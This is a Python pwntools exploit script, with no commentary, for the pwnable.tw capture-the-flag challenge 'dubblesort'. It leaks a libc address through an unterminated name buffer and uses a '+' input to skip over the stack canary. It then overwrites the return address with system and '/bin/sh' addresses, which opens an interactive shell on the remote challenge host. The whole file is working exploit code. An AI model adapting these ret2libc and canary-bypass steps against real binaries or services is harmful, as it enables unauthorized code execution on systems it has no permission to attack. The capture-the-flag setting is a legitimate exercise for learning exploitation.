from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = remote('chall.pwnable.tw', 10101)
#p = process('./dubblesort')
elf = ELF('./dubblesort')
libc = ELF('./libc_32.so.6')

p.recvuntil(b':')
p.sendline(b'a' * 28)

p.recvline()
libc_base = u32(b'\x00' + p.recv(3)) - 0x1b0000
print('libc base:', hex(libc_base))

system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

p.recvuntil(b':')
p.sendline(str(24 + 1 + 9 + 1))
for i in range(24):
    p.recvuntil(b'number :')
    p.sendline(b'0')

p.recvuntil(b'number :')
p.sendline(b'+')

for i in range(9):
    p.recvuntil(b'number :')
    p.sendline(str(system))

p.recvuntil(b'number :')
p.sendline(str(bin_sh))

p.interactive()